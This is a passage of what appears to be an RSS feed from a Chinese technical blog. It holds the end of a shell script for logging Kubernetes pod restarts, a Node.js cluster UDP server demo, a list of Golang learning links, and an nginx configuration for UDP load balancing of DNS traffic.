&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;echo $line | awk &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;{print $1}&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;# 重启次数&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  count&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;echo $line | awk &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;{print $2}&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;# 检查本次重启的pod名称是否在之前的记录中存在&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; grep $name restart.old.log; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# 如果存在，则取出之前记录的重启次数&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  	t&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;grep $name restart.old.log | awk &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;{print $2}&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# 和本次记录的重启次数比较，如果本次的重启次数较大&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# 则说明pod一定重启过&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; $count -gt $t&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    	echo $now ERROR pod_restart $name &amp;gt;&amp;gt; $log_file
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  	&lt;span style=&#34;color:#75715e&#34;&gt;# 如果重启的pod不存在之前的记录中，也说明pod重启过&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  	echo $now ERROR pod_restart $name &amp;gt;&amp;gt; $log_file
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt; &amp;lt; restart.now.log
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 删除老的记录文件&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rm -f restart.old.log
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 将新的记录文件重命名为老的记录文件&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mv restart.now.log restart.old.log
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后可以将上面的脚本做成定时任务，每分钟执行一次。那么就可以将pod重启的信息写入文件。&lt;/p&gt;</description>
    </item>
    <item>
      <title>udp cluster 多进程调度策略学习</title>
      <link>https://wdd.js.org/posts/2021/07/tniabf/</link>
      <pubDate>Wed, 21 Jul 2021 12:57:03 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/07/tniabf/</guid>
      <description>&lt;p&gt;本来我的目的是使用cluster模块的fork出多个进程，让各个进程都能处理udp消息的。但是最终测试发现，实际上仅有一个进程处理了绝大数消息，其他的进程，要么不处理消息，要么处理的非常少的消息。&lt;/p&gt;
&lt;p&gt;然而使用cluster来开启http服务的多进程，却能够达到多进程的负载。&lt;/p&gt;
&lt;h1 id=&#34;server端demo代码&#34;&gt;server端demo代码：&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-makefile&#34; data-lang=&#34;makefile&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;const&lt;/span&gt; cluster &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; require&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cluster&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;const&lt;/span&gt; numCPUs &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; require&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;os&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.cpus&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;.length
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;{&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;logger&lt;/span&gt; } &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; require&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./logger&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;const&lt;/span&gt; dgram &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; require&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;dgram&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;//&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;{&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;createHTTPServer,&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;createUDPServer&lt;/span&gt; } &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; require&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./app&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;const&lt;/span&gt; port &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8088&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;(cluster.isMaster)&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;(let&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0; i &amp;lt; numCPUs; i++&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    cluster.fork&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  cluster.on&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;exit&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;worker, code, signal&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    logger.info&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;工作进程 &lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;worker.process.pid&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt; 已退出&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;})&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;const&lt;/span&gt; server &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; dgram.createSocket&lt;span style=&#34;color:#f92672&#34;&gt;({&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    type: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;udp4&amp;#39;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    reuseAddr: true
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;})&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  server.on&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;error&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;err&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    logger.info&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;udp server error:&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;err.stack&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    server.close&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;})&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  server.on&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;message&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;msg, rinfo&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    logger.info&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;process.pid&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt; udp server got: &lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;msg&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt; from &lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;rinfo.address&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;rinfo.port&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;})&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  server.on&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;listening&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    const address &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; server.address&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    logger.info&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;udp server listening &lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;address.address&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;address.port&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;})&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  server.bind&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;port&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;日志库如下：&lt;/p&gt;</description>
    </item>
    <item>
      <title>Golang学习资料</title>
      <link>https://wdd.js.org/golang/learn-material/</link>
      <pubDate>Sun, 18 Jul 2021 21:39:59 +0800</pubDate>
      <guid>https://wdd.js.org/golang/learn-material/</guid>
      <description>&lt;h1 id=&#34;在线书籍&#34;&gt;在线书籍&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;《Go语言原本》https://golang.design/under-the-hood/&lt;/li&gt;
&lt;li&gt;《Golang修养之路》https://www.kancloud.cn/aceld/golang&lt;/li&gt;
&lt;li&gt;《Go语言高性能编程》https://geektutu.com/post/high-performance-go.html&lt;/li&gt;
&lt;li&gt;《7天用Go从零实现Web框架Gee教程》https://geektutu.com/post/gee.html&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;博客关注&#34;&gt;博客关注&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://carlosbecker.com/&#34;&gt;https://carlosbecker.com/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.alexedwards.net/blog&#34;&gt;https://www.alexedwards.net/blog&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://gobyexample.com/&#34;&gt;https://gobyexample.com/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;文章收藏&#34;&gt;文章收藏&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://carlosbecker.com/posts/env-structs-golang&#34;&gt;https://carlosbecker.com/posts/env-structs-golang&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.alexedwards.net/blog/json-surprises-and-gotchas&#34;&gt;https://www.alexedwards.net/blog/json-surprises-and-gotchas&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.alexedwards.net/blog/how-to-manage-database-timeouts-and-cancellations-in-go&#34;&gt;https://www.alexedwards.net/blog/how-to-manage-database-timeouts-and-cancellations-in-go&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.alexedwards.net/blog/custom-command-line-flags&#34;&gt;https://www.alexedwards.net/blog/custom-command-line-flags&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.alexedwards.net/blog/how-to-properly-parse-a-json-request-body&#34;&gt;https://www.alexedwards.net/blog/how-to-properly-parse-a-json-request-body&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.alexedwards.net/blog/working-with-redis&#34;&gt;https://www.alexedwards.net/blog/working-with-redis&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.alexedwards.net/blog/organising-database-access&#34;&gt;https://www.alexedwards.net/blog/organising-database-access&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.alexedwards.net/blog/interfaces-explained&#34;&gt;https://www.alexedwards.net/blog/interfaces-explained&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>使用nginx为udp服务负载均衡</title>
      <link>https://wdd.js.org/posts/2021/07/tom7mv/</link>
      <pubDate>Sat, 17 Jul 2021 19:28:18 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/07/tom7mv/</guid>
      <description>&lt;h1 id=&#34;对nginx的最低版本要求是&#34;&gt;对nginx的最低版本要求是？&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;1.9.13&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;The ngx_stream_proxy_module module (1.9.0) allows proxying data streams over TCP, UDP (1.9.13), and UNIX-domain sockets.&lt;/p&gt;&lt;/blockquote&gt;
&lt;h1 id=&#34;简单的配置是什么样&#34;&gt;简单的配置是什么样？&lt;/h1&gt;
&lt;p&gt;例如监听本地53的udp端口，然后转发到192.168.136.130和192.168.136.131的53端口&lt;/p&gt;
&lt;p&gt;注意事项&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;stream是顶层的配置，不能包含在http模块里面&lt;/li&gt;
&lt;li&gt;proxy_responses很重要，如果你的udp服务只接受udp消息，并不发送udp消息，那么务必将proxy_responses的值设置为0&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-makefile&#34; data-lang=&#34;makefile&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;stream&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;upstream&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;dns_upstreams&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;server 192.168.136.130&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;53;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        server 192.168.136.131:53;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    server &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        listen &lt;span style=&#34;color:#ae81ff&#34;&gt;53&lt;/span&gt; udp;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        proxy_pass dns_upstreams;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        proxy_timeout 1s;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        proxy_responses 0;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        error_log logs/dns.log;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;| Syntax: | &lt;strong&gt;proxy_responses&lt;/strong&gt; &lt;em&gt;number&lt;/em&gt;;&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;/th&gt;
          &lt;th&gt;&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;Default:&lt;/td&gt;
          &lt;td&gt;—&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Context:&lt;/td&gt;
          &lt;td&gt;stream, server&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;|&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;This directive appeared in version 1.9.13.&lt;/p&gt;&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Sets the number of datagrams expected from the proxied server in response to a client datagram if the &lt;a href=&#34;http://nginx.org/en/docs/stream/ngx_stream_core_module.html#udp&#34;&gt;UDP&lt;/a&gt; protocol is used. The number serves as a hint for session termination. By default, the number of datagrams is not limited.
&lt;strong&gt;If zero value is specified, no response is expected&lt;/strong&gt;. However, if a response is received and the session is still not finished, the response will be handled.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Js Trailing Commas</title>
      <link>https://wdd.js.org/fe/js-trailing-commas/</link>
      <pubDate>Sat, 10 Jul 2021 14:03:00 +0800</pubDate>
      <guid>https://wdd.js.org/fe/js-trailing-commas/</guid>
